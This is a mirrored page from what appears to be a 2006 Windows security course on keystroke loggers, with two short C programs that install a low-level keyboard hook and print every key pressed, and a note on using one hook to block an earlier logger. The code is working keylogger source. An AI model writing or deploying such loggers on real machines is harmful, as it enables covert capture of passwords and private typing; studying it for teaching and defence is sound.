@@ -1,0 +1,183 @@
+<html xmlns:o="urn:schemas-microsoft-com:office:office"
+xmlns:w="urn:schemas-microsoft-com:office:word"
+xmlns="http://www.w3.org/TR/REC-html40">
+
+
+<!-- Mirrored from www.vijaymukhi.com/seccourse/mar1606/html/keystrokeloggers.htm by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 11 Oct 2024 14:42:37 GMT -->
+<head>
+<meta http-equiv=Content-Type content="text/html; charset=windows-1252">
+<meta name=ProgId content=Word.Document>
+<meta name=Generator content="Microsoft Word 9">
+<meta name=Originator content="Microsoft Word 9">
+<link rel=File-List href="keystrokeloggers_files/filelist.html">
+<title>Keystroke Loggers</title>
+<!--[if gte mso 9]><xml>
+ <o:DocumentProperties>
+  <o:Author>Vijay Mukhi</o:Author>
+  <o:Template>Normal</o:Template>
+  <o:LastAuthor>Sonal Mukhi</o:LastAuthor>
+  <o:Revision>2</o:Revision>
+  <o:TotalTime>11</o:TotalTime>
+  <o:Created>2006-03-17T10:07:00Z</o:Created>
+  <o:LastSaved>2006-03-17T10:07:00Z</o:LastSaved>
+  <o:Pages>2</o:Pages>
+  <o:Words>248</o:Words>
+  <o:Characters>1416</o:Characters>
+  <o:Company>VMCI</o:Company>
+  <o:Lines>11</o:Lines>
+  <o:Paragraphs>2</o:Paragraphs>
+  <o:CharactersWithSpaces>1738</o:CharactersWithSpaces>
+  <o:Version>9.2720</o:Version>
+ </o:DocumentProperties>
+</xml><![endif]-->
+<style>
+<!--
+ /* Style Definitions */
+p.MsoNormal, li.MsoNormal, div.MsoNormal
+	{mso-style-parent:"";
+	margin:0in;
+	margin-bottom:.0001pt;
+	mso-pagination:widow-orphan;
+	font-size:12.0pt;
+	font-family:"Times New Roman";
+	mso-fareast-font-family:"Times New Roman";}
+@page Section1
+	{size:8.5in 11.0in;
+	margin:1.0in 1.25in 1.0in 1.25in;
+	mso-header-margin:.5in;
+	mso-footer-margin:.5in;
+	mso-paper-source:0;}
+div.Section1
+	{page:Section1;}
+-->
+</style>
+</head>
+
+<body lang=EN-US style='tab-interval:.5in'>
+
+<div class=Section1>
+
+<p class=MsoNormal>Keystroke Loggers</p>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+<p class=MsoNormal>#define _WIN32_WINNT 0x0400</p>
+
+<p class=MsoNormal>#include &lt;windows.h&gt;</p>
+
+<p class=MsoNormal>MSG m;HINSTANCE h;HHOOK k;char aa[100];KBDLLHOOKSTRUCT o;int
+i,key;</p>
+
+<p class=MsoNormal>__declspec(dllexport) int __stdcall zzz(int code,unsigned
+int w,long l)</p>
+
+<p class=MsoNormal>{</p>
+
+<p class=MsoNormal>KBDLLHOOKSTRUCT *o1;</p>
+
+<p class=MsoNormal>o = *((KBDLLHOOKSTRUCT*)l);</p>
+
+<p class=MsoNormal>key = o.scanCode &lt;&lt; 16;</p>
+
+<p class=MsoNormal>key += o.flags &lt;&lt; 24;</p>
+
+<p class=MsoNormal>GetKeyNameText(key,aa,100);</p>
+
+<p class=MsoNormal>if ( o.flags == 0)</p>
+
+<p class=MsoNormal>printf(&quot;%s&quot;,aa);</p>
+
+<p class=MsoNormal>printf(&quot; Code is %d\n&quot;,code);</p>
+
+<p class=MsoNormal>if ( code &lt; 0 )</p>
+
+<p class=MsoNormal>return CallNextHookEx(0,code,w,l);</p>
+
+<p class=MsoNormal>else</p>
+
+<p class=MsoNormal>return 0;</p>
+
+<p class=MsoNormal>}</p>
+
+<p class=MsoNormal>main(int argc , char *argv[])</p>
+
+<p class=MsoNormal>{</p>
+
+<p class=MsoNormal>printf(&quot;%d\n&quot;,HC_NOREMOVE);</p>
+
+<p class=MsoNormal>h = GetModuleHandle(0);</p>
+
+<p class=MsoNormal>k = SetWindowsHookEx (WH_KEYBOARD_LL,zzz,h,0);
+//WH_KEYBOARD_LL=13</p>
+
+<p class=MsoNormal>while (GetMessage(&amp;m,0,0,0)) </p>
+
+<p class=MsoNormal>DispatchMessage( &amp;m );</p>
+
+<p class=MsoNormal>}</p>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+<p class=MsoNormal>In the earlier code, we simply called the next hook
+procedure. The value of code is normally 0. If we return 0, we are telling
+windows not to call the next windows hook function. Thus we first run the
+original keystroke logger, then we run the above logger. This will effectively
+block the first keystroke logger. When we quit out of the above logger, then
+the first one gets reactivated. This is a very simple way of disabling<span
+style="mso-spacerun: yes">  </span>a keystroke logger after they have been run.</p>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+<p class=MsoNormal>The next program is the smallest keystroke logger with all
+the frills removed.</p>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+<p class=MsoNormal>#define _WIN32_WINNT 0x0400</p>
+
+<p class=MsoNormal>#include &lt;windows.h&gt;</p>
+
+<p class=MsoNormal>MSG m;char aa[100];int i,key;</p>
+
+<p class=MsoNormal>__declspec(dllexport) int __stdcall zzz(int code,unsigned
+int w,long l)</p>
+
+<p class=MsoNormal>{</p>
+
+<p class=MsoNormal>KBDLLHOOKSTRUCT *o1 = (KBDLLHOOKSTRUCT*) l;</p>
+
+<p class=MsoNormal>key = o1-&gt;scanCode &lt;&lt; 16;</p>
+
+<p class=MsoNormal>key += o1-&gt;flags &lt;&lt; 24;</p>
+
+<p class=MsoNormal>GetKeyNameText(key,aa,100);</p>
+
+<p class=MsoNormal>if ( o1-&gt;flags == 0)</p>
+
+<p class=MsoNormal>printf(&quot;%s&quot;,aa);</p>
+
+<p class=MsoNormal>return CallNextHookEx(0,code,w,l);</p>
+
+<p class=MsoNormal>}</p>
+
+<p class=MsoNormal>main(int argc , char *argv[])</p>
+
+<p class=MsoNormal>{</p>
+
+<p class=MsoNormal>SetWindowsHookEx (WH_KEYBOARD_LL,zzz,0x400000,0); </p>
+
+<p class=MsoNormal>while (GetMessage(&amp;m,0,0,0)) </p>
+
+<p class=MsoNormal>DispatchMessage( &amp;m );</p>
+
+<p class=MsoNormal>}</p>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+</div>
+
+</body>
+
+
+<!-- Mirrored from www.vijaymukhi.com/seccourse/mar1606/html/keystrokeloggers.htm by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 11 Oct 2024 14:42:38 GMT -->
+</html>
